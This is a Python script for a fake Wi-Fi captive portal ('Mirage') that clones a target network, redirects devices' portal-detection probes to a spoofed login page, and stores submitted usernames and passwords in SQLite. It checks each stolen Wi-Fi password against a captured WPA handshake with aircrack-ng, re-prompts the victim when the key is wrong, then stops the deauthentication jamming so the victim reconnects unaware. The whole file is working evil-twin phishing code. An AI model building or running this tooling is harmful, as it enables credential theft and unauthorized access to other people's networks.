#!/usr/bin/env python3
# Mirage portal server with credential storage.
import http.server
import socketserver
import os
import sqlite3
import subprocess
import tempfile
import urllib.parse
import json
from datetime import datetime

PORTAIL = "/opt/fennec-mirage/portal"
BIND = "10.0.0.1"
PORT = 80
DB_PATH = "/opt/fennec-mirage/credentials.db"
TARGET_FILE = "/tmp/fennec-mirage-target"


def current_essid():
    """ESSID of the network currently being cloned, to tag each capture with it."""
    try:
        with open(TARGET_FILE, encoding="utf-8") as f:
            return f.readline().strip() or None
    except OSError:
        return None

# Captive portal detection probes used by common operating systems.
SONDES = {
    "/generate_204", "/gen_204", "/ncsi.txt", "/connecttest.txt",
    "/hotspot-detect.html", "/library/test/success.html",
    "/redirect", "/canonical.html", "/success.txt"
}

def init_db():
    """Initialize the SQLite database."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            username TEXT,
            password TEXT,
            user_agent TEXT,
            ip_address TEXT,
            portal_page TEXT,
            essid TEXT
        )
    ''')
    # Older databases predate the essid column; add it if missing.
    cols = [r[1] for r in cursor.execute("PRAGMA table_info(credentials)").fetchall()]
    if "essid" not in cols:
        cursor.execute("ALTER TABLE credentials ADD COLUMN essid TEXT")
    conn.commit()
    conn.close()

def save_credentials(username, password, user_agent, ip_address, portal_page):
    """Save credentials to the database."""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO credentials (timestamp, username, password, user_agent, ip_address, portal_page, essid)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (datetime.now().isoformat(), username, password, user_agent, ip_address, portal_page, current_essid()))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"Error saving credentials: {e}")
        return False


HANDSHAKE_DIR = "/etc/pwnagotchi/handshakes"
META_FILE = "/tmp/fennec-mirage-meta.json"


def _target_bssid():
    try:
        with open(META_FILE, encoding="utf-8") as f:
            return (json.load(f).get("bssid") or "").upper()
    except Exception:
        return ""


def _handshake_for(bssid):
    key = bssid.replace(":", "").lower()
    try:
        for name in os.listdir(HANDSHAKE_DIR):
            if name.lower().endswith(".pcap") and key in name.lower().replace(":", ""):
                return os.path.join(HANDSHAKE_DIR, name)
    except OSError:
        pass
    return None


def verify_password(password):
    """Check the submitted password against a captured handshake for the target.
    True = correct, False = wrong (handshake valid, key rejected), None = cannot
    check (no BSSID, no handshake, or no valid handshake to test against)."""
    bssid = _target_bssid()
    if not bssid or not password:
        return None
    pcap = _handshake_for(bssid)
    if not pcap:
        return None
    wl = None
    try:
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt") as wf:
            wf.write(password + "\n")
            wl = wf.name
        r = subprocess.run(["aircrack-ng", "-a2", "-b", bssid, "-w", wl, pcap],
                           capture_output=True, text=True, timeout=90)
        if "KEY FOUND" in r.stdout:
            return True
        if "Passphrase not in dictionary" in r.stdout:
            return False
        return None
    except Exception:
        return None
    finally:
        if wl:
            try:
                os.unlink(wl)
            except OSError:
                pass


def release_victim():
    """After a capture, let the success page load, then stop the jamming and the
    fake AP so the victim's device reconnects to the real network on its own.
    Detached so it survives the portal being torn down together with the AP."""
    try:
        subprocess.Popen(
            ["/bin/sh", "-c",
             "sleep 6; systemctl stop fennec-mirage-deauth; systemctl stop fennec-mirage"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
    except Exception as e:
        print(f"[MIRAGE] release failed: {e}")


class H(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory=PORTAIL, **k)

    def log_message(self, *a):
        pass

    def do_GET(self):
        path = self.path.split("?")[0]
        # Captive portal detection probe -> redirect to the portal.
        if path in SONDES:
            self.send_response(302)
            self.send_header("Location", f"http://{BIND}/")
            self.end_headers()
            return
        # Otherwise serve the requested file.
        local = os.path.join(PORTAIL, path.lstrip("/"))
        if not os.path.isfile(local):
            self.path = "/index.html"
        super().do_GET()

    def do_POST(self):
        """Handle login form submission."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Parse form data.
        params = urllib.parse.parse_qs(post_data)

        # Extract username and password using the form field names.
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]

        # Collect additional request metadata.
        user_agent = self.headers.get('User-Agent', '')
        ip_address = self.client_address[0]
        portal_page = self.path

        # Verify the password against a captured handshake when we can.
        if password:
            if verify_password(password) is False:
                # Wrong password: keep the attack running and re-prompt the victim.
                print("[MIRAGE] Wrong password submitted; re-prompting.")
                self.send_response(302)
                self.send_header("Location", f"http://{BIND}/?error=1")
                self.end_headers()
                return
            # Correct, or no handshake to verify against: accept it.
            save_credentials(username, password, user_agent, ip_address, portal_page)
            print(f"[MIRAGE] Credentials captured: {username}")
            release_victim()

        # Redirect to a success page after submission.
        self.send_response(302)
        self.send_header("Location", f"http://{BIND}/success.html")
        self.end_headers()

# Initialize the database at startup.
init_db()

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer((BIND, PORT), H) as httpd:
    print(f"[MIRAGE] Portal server running on {BIND}:{PORT}")
    print(f"[MIRAGE] Database: {DB_PATH}")
    httpd.serve_forever()
